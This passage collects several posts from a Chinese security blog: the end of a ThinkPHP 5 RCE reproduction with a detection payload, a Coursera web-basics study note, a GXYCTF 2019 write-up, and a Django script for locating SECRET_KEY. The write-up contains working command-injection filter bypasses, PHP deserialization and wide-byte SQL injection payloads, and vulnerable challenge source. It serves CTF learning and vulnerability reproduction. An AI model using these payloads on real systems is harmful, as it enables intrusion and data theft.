<p>再跟进parseModuleAndClass</p>
<pre><code class="php">protected function parseModuleAndClass($name, $layer, $appendSuffix)
    {
        if (false !== strpos($name, &#39;\\&#39;)) {
            $class  = $name;//存在\
            $module = $this-&gt;request-&gt;module();
        } else {
            if (strpos($name, &#39;/&#39;)) {
                list($module, $name) = explode(&#39;/&#39;, $name, 2);
            } else {
                $module = $this-&gt;request-&gt;module();
            }

            $class = $this-&gt;parseClass($module, $layer, $name, $appendSuffix);
        }

        return [$module, $class];
    }</code></pre>
<p>如果存在\则直接返回数据,其中<code>$name</code>是我们可控内容,而<code>$name</code>也恰好是类名,于是我们可以通过调用命名空间\类来进行敏感操作</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查找手册,找到url访问的具体细节</p>
<p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p>
<p>于是有通杀tp5.0.x和tp5.1.x的检测payload</p>
<p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/01/28/tp5rce复现/">http://blog.ccreater.top/2020/01/28/tp5rce复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/" data-id="cka3ckr3a003mv4v00cq8hsg9" data-title="tp5rce复现" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-coursera-杜克大学 程序设计与 Web 入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" class="article-date">
  <time class="dt-published" datetime="2020-01-24T16:41:56.268Z" itemprop="datePublished">2020-01-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/">coursera-杜克大学 程序设计与 Web 入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="coursera-杜克大学-程序设计与-Web-入门"><a href="#coursera-杜克大学-程序设计与-Web-入门" class="headerlink" title="coursera-杜克大学 程序设计与 Web 入门"></a>coursera-杜克大学 程序设计与 Web 入门</h1><h2 id="在coursera上学习的感受"><a href="#在coursera上学习的感受" class="headerlink" title="在coursera上学习的感受"></a>在coursera上学习的感受</h2><p>我觉得最大的优点是:教学和练习同时进行,极大的帮助了我快速掌握知识,这是我最喜欢的一点.但是对于中国境内的视频 加载有点难受,不过可以通过修改hosts来改善.</p>
<p>虽然这种教学方式我很喜欢,但是由于我的课程选择不太适合我自己(太基础了),导致我其实没学到啥,但是我还是硬着头皮看完了(闲得无聊?),选择适合自己的课程真的特别重要</p>
<h2 id="提问问题的注意事项"><a href="#提问问题的注意事项" class="headerlink" title="提问问题的注意事项"></a>提问问题的注意事项</h2><p><strong>详细</strong>,<strong>清楚</strong>的描述自己遇到的问题,及自己尝试解决问题的结果</p>
<h2 id="css语法"><a href="#css语法" class="headerlink" title="css语法"></a>css语法</h2><pre><code class="css">.classname{
    preperty:value;
}

#ID{
    preperty:value;
}
tagname {
    preperty:value;
}
;or
tag1 tag2 {
    preperty:value;
}
;这个会修改tag1下的tag2</code></pre>
<h2 id="css资料"><a href="#css资料" class="headerlink" title="css资料"></a>css资料</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p> <a href="https://www.w3schools.com/css/css_border.asp" target="_blank" rel="noopener">https://www.w3schools.com/css/css_border.asp</a> </p>
<h3 id="css-colors"><a href="#css-colors" class="headerlink" title="css colors"></a>css colors</h3><p> <a href="https://www.w3schools.com/cssref/css_colors.asp" target="_blank" rel="noopener">https://www.w3schools.com/cssref/css_colors.asp</a> </p>
<p> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Colors/Color_picker_tool</a></p>
<p> <a href="http://www.w3schools.com/colors/colors_picker.asp" target="_blank" rel="noopener">http://www.w3schools.com/colors/colors_picker.asp</a></p>
<h2 id="用编程解决问题的七步骤"><a href="#用编程解决问题的七步骤" class="headerlink" title="用编程解决问题的七步骤"></a>用编程解决问题的七步骤</h2><ol>
<li>Work example by hand.<br>清晰的认识要解决的问题,并手动尝试解决</li>
<li>Write down what you did.<br>写下自己解决问题的过程(只针对这个具体的例子),不要忽略我们理所当然的东西,计算机不会这么想,我们要尽可能的详细,精确的记录我们解决问题的步骤</li>
<li>Find patterns.<br>将过程抽象成解决这个问题的一般性步骤,注意重复的步骤(变为循环语句),注意判断(变为条件语句)</li>
<li>Check by hand.<br>用具体的例子来检验抽象的步骤是否能解决问题</li>
<li>Translate to code. </li>
<li>Run test cases. </li>
<li>Debug failed test cases.<br>一般可以把问题分为:步骤问题(如没考虑某些特殊情况)和将步骤转为程序时(如函数用错)的问题</li>
</ol>
<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="手册"><a href="#手册" class="headerlink" title="手册"></a>手册</h3><p> <a href="https://developer.mozilla.org/" target="_blank" rel="noopener">https://developer.mozilla.org/</a> </p>
<p> <a href="https://www.w3schools.com/" target="_blank" rel="noopener">https://www.w3schools.com/</a> </p>
<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><pre><code class="javascript">var img = new SimpleImage(200, 200);
for(var pixel of img.values())
{//pixel是img.values()的引用
    pixel.setRed(255);
    pixel.setGreen(255);
    pixel.setBlue(0);
}
print(img);</code></pre>
<h3 id="canvas操作"><a href="#canvas操作" class="headerlink" title="canvas操作"></a>canvas操作</h3><pre><code class="javascript">var canvas=document.getElementById(&quot;show2&quot;);
var context = canvas.getContext(&#39;2d&#39;);
#init
context.clearRect(0, 0, canvas.width, canvas.height);
#clear canvas
context.font = &quot;30px Arial&quot;;
context.fillText(&quot;Hello World&quot;, 10, 50);
#draw a text


context.fillStyle = &quot;red&quot;;
context.fillRect(10, 10, 150, 80);
#draw rectangle</code></pre>
<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><p>当变量是数字和字符串的时候,会生成一个拷贝,再赋值给目标</p>
<p>但如果对象是数组和对象时,这会将引用赋值给目标,此时修改新变量也会影响到旧变量</p>
<h2 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h2><h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><code>&lt;input type=&quot;color&quot; id=&quot;color&quot; value=&quot;pink&quot; onchange=&quot;colorchange()&quot;&gt;</code></p>
<h4 id="botton"><a href="#botton" class="headerlink" title="botton"></a>botton</h4><p><code>&lt;input type=&quot;button&quot; value=&quot;make pink&quot; onclick=&quot;makepink()&quot;&gt;</code></p>
<h4 id="range"><a href="#range" class="headerlink" title="range"></a>range</h4><p><code>&lt;input type=&quot;range&quot; min=&quot;10&quot; max=&quot;100&quot; value=&quot;10&quot; id=&quot;slr&quot; oninput=doSquare()&gt;</code></p>
<h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>onclick,onchage,oninput</p>
<h2 id="给自己的建议"><a href="#给自己的建议" class="headerlink" title="给自己的建议"></a>给自己的建议</h2><blockquote>
<p>合格的程序员不应该浪费很多时间用于程序调试,他们应该一开始就不要把故障引入.</p>
<p>—-迪杰斯特拉</p>
</blockquote>
<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p><img src="https://i.loli.net/2020/01/20/bmQ5AvDenOHlqP7.png" alt="image2319"></p>
<p>发现bug-&gt;明确目的(了解bug发生的原因及解决方法)-&gt;收集信息-&gt;(多次)提出猜想(where,why)(要具有可测试性)-&gt;验证-&gt;解决</p>
<h2 id="final-work"><a href="#final-work" class="headerlink" title="final work"></a>final work</h2><p> <a href="https://codepen.io/explorersss/full/wvBOwmR" target="_blank" rel="noopener">https://codepen.io/explorersss/full/wvBOwmR</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/25/coursera-杜克大学">http://blog.ccreater.top/2020/01/25/coursera-杜克大学</a> 程序设计与 Web 入门/](<a href="http://blog.ccreater.top/2020/01/25/coursera-杜克大学">http://blog.ccreater.top/2020/01/25/coursera-杜克大学</a> 程序设计与 Web 入门/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" data-id="cka3ckr2l001pv4v0d5p1gijw" data-title="coursera-杜克大学 程序设计与 Web 入门" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-gxyctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/22/gxyctf2019/" class="article-date">
  <time class="dt-published" datetime="2019-12-21T16:58:45.140Z" itemprop="datePublished">2019-12-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/22/gxyctf2019/">gxytf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="gxyctf"><a href="#gxyctf" class="headerlink" title="gxyctf"></a>gxyctf</h1><h2 id="ping-ping-ping"><a href="#ping-ping-ping" class="headerlink" title="ping ping ping"></a>ping ping ping</h2><p>过滤$,’ ‘,</p>
<p>未过滤符号:<code>!,#,$,%,(,.,+,-,:,;,=</code></p>
<p>过滤空格用$IFS来代替</p>
<p>过滤flag</p>
<p>用base64来绕过</p>
<p><code>aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat</code></p>
<pre><code class="php">    &lt;?php
    if(isset($_GET[&#39;ip&#39;])){
        $ip = $_GET[&#39;ip&#39;];
        if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
            echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
            die(&quot;fxck your symbol!&quot;);
        }
        else if(preg_match(&quot;/ /&quot;, $ip)){
            die(&quot;fxck your space!&quot;);
        }
        else if(preg_match(&quot;/bash/&quot;, $ip)){
            die(&quot;fxck your bash!&quot;);
        }
        else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
            die(&quot;fxck your flag!&quot;);
        }
        $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
        echo &quot;&lt;pre&gt;&quot;;
        print_r($a);
    }

    ?&gt;</code></pre>
<p><code>asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><strong>没做出来忽略他</strong></p>
<p>上传类型也太露骨了把:检测后缀还是上传类型?</p>
<p>Content-Type: image/jpeg,可以上传了</p>
<p>上传文件后无法访问404</p>
<p>上传文件所在文件夹和session有关</p>
<p>将session置空后报错</p>
<pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;</code></pre>
<p>猜测随机生成一个值放到session里面</p>
<p>php版本5.6可以%00截断</p>
<p>后缀不能以ph结尾</p>
<h2 id="Do-you-know-robot"><a href="#Do-you-know-robot" class="headerlink" title="Do you know robot"></a>Do you know robot</h2><blockquote>
<p>PHP 在反序列化 string 时没有严格按照序列化格式 <code>s:x:&quot;x&quot;;</code>进行处理，没有对 <code>&quot;</code>后面的是否存在 <code>;</code> 进行判断，同时增加了对十六进制形式字符串的处理，这样前后处理的不一致让人很费解，同时由于 PHP 手册中对此没有详细的说明，大部分程序员对此处理过程并不了解，这可能导致其在编码过程中出现疏漏，甚至导致严重的安全问题。</p>
</blockquote>
<pre><code class="php">&lt;?php 
class FileReader{
    public $Filename;
    public $start;
    public $max_length;
    function __construct(){
        $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;;
        $this-&gt;start = 12;
        $this-&gt;max_length = 72;
    }

    function __wakeup(){
        $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;;
        $this-&gt;start = 10;
        $this-&gt;max_length = 0;
        echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
    }

    function __destruct(){
        $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length);
        if(preg_match(&quot;/\{|\}/&quot;, $data)){
            die(&quot;you can&#39;t read flag!&quot;);
        }
        else{
            echo $data;
        }
    }
}

if(isset($_GET[&#39;exp&#39;])){
    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;exp&#39;])){
        die(&quot;hack!&quot;);
    }
    $exp = $_REQUEST[&#39;exp&#39;];
    $e = unserialize($exp);
    echo $e-&gt;Filename;
}
else{
    $exp = new FileReader();
}


?&gt;</code></pre>
<p>令属性数量与实际数量不同来绕过<code>__wakeup</code></p>
<p>利用16进制绕过flag的限制</p>
<p><code>O:10:&quot;FileReader&quot;:4:{s:8:&quot;Filename&quot;;S:71:&quot;\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:10000;}</code></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>正则匹配的四<code>$_GET</code>,而传的参数是<code>$_REQUEST</code>,从而绕过</p>
<h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select 设置自己的密码拿到flag</p>
<h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>和bytectf2019有点类似 <a href="https://blog.zeddyu.info/2019/09/17/bytectf2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/09/17/bytectf2019/</a> </p>
<p><code>var_dump(scandir(chr(time())));</code></p>
<p><code>array(5) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; }</code></p>
<p>chr,random_bytes</p>
<p>翻数组相关的函数找到array_rand,但是遗憾的是返回的是键名,如果我们能交换键名和值就可以拿到flag.php了,再找一找发现array_filp</p>
<p>最后的payload</p>
<p><code>var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));</code></p>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p><code>readfile(session_id(session_start()))</code></p>
<p>然后<code>PHPSESSID=flag.php</code>读到flag</p>
<h2 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h2><p>提到中文,宽字节注入绕过引号</p>
<p>过滤select,union,where等</p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23</code></p>
<p>回显密码</p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23</code></p>
<p>数据库:<code>information_schema,web_sqli</code></p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23</code></p>
<p>表:<code>f14g,user</code></p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23</code></p>
<p>列:<code>b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
<p>读取flag,但是有长度限制</p>
<p>最后得到抖肩舞+flag</p>
<p>GXY{g0Od_job1im_so_vegetable}</p>
<h2 id="babysqliv3-0"><a href="#babysqliv3-0" class="headerlink" title="babysqliv3.0"></a>babysqliv3.0</h2><p>对phpsession注入报错</p>
<pre><code class="html">&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in &lt;b&gt;/var/www/html/search.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=uft-8&quot;/&gt;&lt;title&gt;login&lt;/title&gt;&lt;script&gt;alert(&#39;Wrong pass&#39;);location.href=&#39;./index.php&#39;&lt;/script&gt;&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#39;-,&#39; in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in &lt;b&gt;Unknown&lt;/b&gt; on line &lt;b&gt;0&lt;/b&gt;&lt;br /&gt;
</code></pre>
<pre><code>[21:19:28] 200 -   89B  - /home.php
[21:19:29] 200 -  562B  - /index.php
[21:19:35] 200 -  253B  - /upload.php
[21:19:35] 301 -  327B  - /uploads  -&gt;  http://183.129.189.60:10023/uploads/
[21:19:35] 403 -  300B  - /uploads/</code></pre><p>fuzz一下发现没啥好注的</p>
<p>再结合扫到的东东,爆破得到密码password</p>
<p>文件上传没用?上传后没有任何提示</p>
<p>content-type改为jpeg,可以上传但是后缀是.txt</p>
<p>如果能控制后缀就可以文件包含了尝试文件名处%00截断无效</p>
<p>home处有文件包含,但是会再末尾添加.fxxkyou(home.php和upload.php不会)</p>
<p>因为题目环境是5.6,尝试%00截断 [ x ]</p>
<p>这里我发现我对文件上传和文件包含部分的掌握不好,以及思考解决方法时候的思考方式不太行</p>
<p>这里利用伪协议直接读取代码,但是我却偏偏没想到这么基础的东西.回去重新学习一下文件包含和上传</p>
<p>代码审计发现phar反序列化可以命令执行</p>
<p>已被魔改</p>
<p>home.php</p>
<pre><code class="php">&lt;?php
echo &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;
error_reporting(0);

if(isset($_GET[&#39;file&#39;])){
    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;hacker!&quot;);
    }
    else{
        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/upload$/i&quot;, $_GET[&#39;file&#39;])){
            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;
        }
        else{
            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;
        }
        echo &quot;当前引用 &quot;.$file;
        require $file;
    }

}
else{
    die(&quot;no permission!&quot;);
}

?&gt;</code></pre>
<p>upload.php</p>
<pre><code class="php">
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 

&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    上传
    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;
&lt;/form&gt;

&lt;?php
class Uploader{
    public $Filename;
    public $cmd;
    public $token;


    function __construct(){
        $sandbox = getcwd().&quot;/uploads/&quot;.md5(&quot;admin&quot;).&quot;/&quot;;
        $ext = &quot;.txt&quot;;
        @mkdir($sandbox, 0777, true);
        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){
            $this-&gt;Filename = $_GET[&#39;name&#39;];
        }
        else{
            $this-&gt;Filename = $sandbox.&quot;admin&quot;.$ext;
        }

        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;
        $this-&gt;token = &quot;admin&quot;;
    }

    function upload($file){
        global $sandbox;
        global $ext;

        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){
            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;
        }
        else{
            if($file[&#39;size&#39;] &gt; 1024){
                $this-&gt;cmd = &quot;die(&#39;you are too big ( :) )&#39;);&quot;;
            }
            else{
                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;
            }
        }
    }

    function __toString(){
        global $sandbox;
        global $ext;
        // return $sandbox.$this-&gt;Filename.$ext;
        return $this-&gt;Filename;
    }

    function __destruct(){
        if($this-&gt;token != &quot;admin&quot;){
            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;
        }
        eval($this-&gt;cmd);
        echo &quot;__destruct&quot;;
    }

}

if(isset($_FILES[&#39;file&#39;])) {
    $uploader = new Uploader();
    $uploader-&gt;upload($_FILES[&quot;file&quot;]);
    if(@file_get_contents($uploader)){
        echo &quot;成功上传&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;
        echo file_get_contents($uploader);
    }
}

?&gt;
</code></pre>
<h2 id="参考-其他人的wp"><a href="#参考-其他人的wp" class="headerlink" title="参考(其他人的wp)"></a>参考(其他人的wp)</h2><ol>
<li><a href="http://www.qfrost.com/PWN/GXY_CTF/" target="_blank" rel="noopener">http://www.qfrost.com/PWN/GXY_CTF/</a> </li>
</ol>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/22/gxyctf2019/">http://blog.ccreater.top/2019/12/22/gxyctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/22/gxyctf2019/" data-id="cka3ckr2u0028v4v03soj00rm" data-title="gxytf2019" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-django快速查找配置" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" class="article-date">
  <time class="dt-published" datetime="2019-12-20T17:14:33.085Z" itemprop="datePublished">2019-12-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/">django快速查找配置</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="django快速查找配置"><a href="#django快速查找配置" class="headerlink" title="django快速查找配置"></a>django快速查找配置</h1><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>在看p牛的picklecode wp的时候卡在secret_key查找那边</p>
<p>看到p牛一句很容易,人就傻掉了</p>
<p><img src="https://i.loli.net/2019/12/21/8mnp5l7ODuPkBQo.png" alt="image209"></p>
<p>花了一天时间(踩了个坑),写了个快速查找secret_key的脚本</p>
<p>代码写的不太好,自己改改用吧////</p>
<pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirect
from django.template import engines
from django.contrib.auth import login as auth_login, get_user_model, authenticate
from django.contrib.auth.views import LoginView, logout_then_login
from django.contrib.auth.decorators import login_required
from django.views import generic
from django import template

import django
from django import template
register = template.Library()

@register.filter
def get_dict(obj,way=&quot;&quot;,depth=0):
    if depth&gt;11:
        return 
    objdir=dir(obj)
    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}
    result=&quot;&quot;

    for i in objdir:            
        try :
            if &#39;_&#39; == i[0]:
                continue
            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:
                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1) 
        except TypeError:
            pass

    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:
        print(way)
        return result+way+&quot;\n&quot;
    return result</code></pre>
<p>这个是把所有符合条件的都输出,你可以通过修改递归深度和返回条件来加快,不然要等个几分钟</p>
<h2 id="顺便说下踩到的坑"><a href="#顺便说下踩到的坑" class="headerlink" title="顺便说下踩到的坑"></a>顺便说下踩到的坑</h2><p>因为不知道dir()和<code>__dict__</code>的区别,一直以为<code>__dict__</code>==dir,然后就boomm</p>
<p>dir()和<code>__dict__</code>的区别</p>
<p>最简单的一句发\话是<code>__dict__</code>是dir的子集合</p>
<p> <a href="https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981" target="_blank" rel="noopener">https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981</a> </p>
<p>所以以后查看对象的所有属性一定要用dir()</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/12/21/django快速查找配置/">http://blog.ccreater.top/2019/12/21/django快速查找配置/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/" data-id="cka3ckr2s0024v4v0dcqj6t8n" data-title="django快速查找配置" class="article-share-link">Share</a>
      
	  
      
      
